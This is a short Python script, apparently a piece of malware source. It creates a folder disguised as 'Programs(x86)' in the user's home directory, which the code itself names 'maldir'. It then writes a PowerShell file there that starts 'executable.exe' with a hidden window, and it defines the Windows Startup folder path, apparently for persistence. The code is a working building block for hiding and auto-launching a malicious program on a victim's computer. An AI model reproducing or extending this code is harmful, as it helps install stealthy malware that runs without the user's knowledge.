import os
startup = "AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
udir = os.path.expanduser("~")
maldir = "Programs(x86)"
mdir = (f"{udir}\\{maldir}")
ps1name = "powershell.ps1"
ps1 = f'Start-Process -WindowStyle Hidden -FilePath "{mdir}\\executable.exe"'
try:
    with open(f"{mdir}\\{ps1name}","w") as f:
        f.write(ps1)
except FileExistsError:
    pass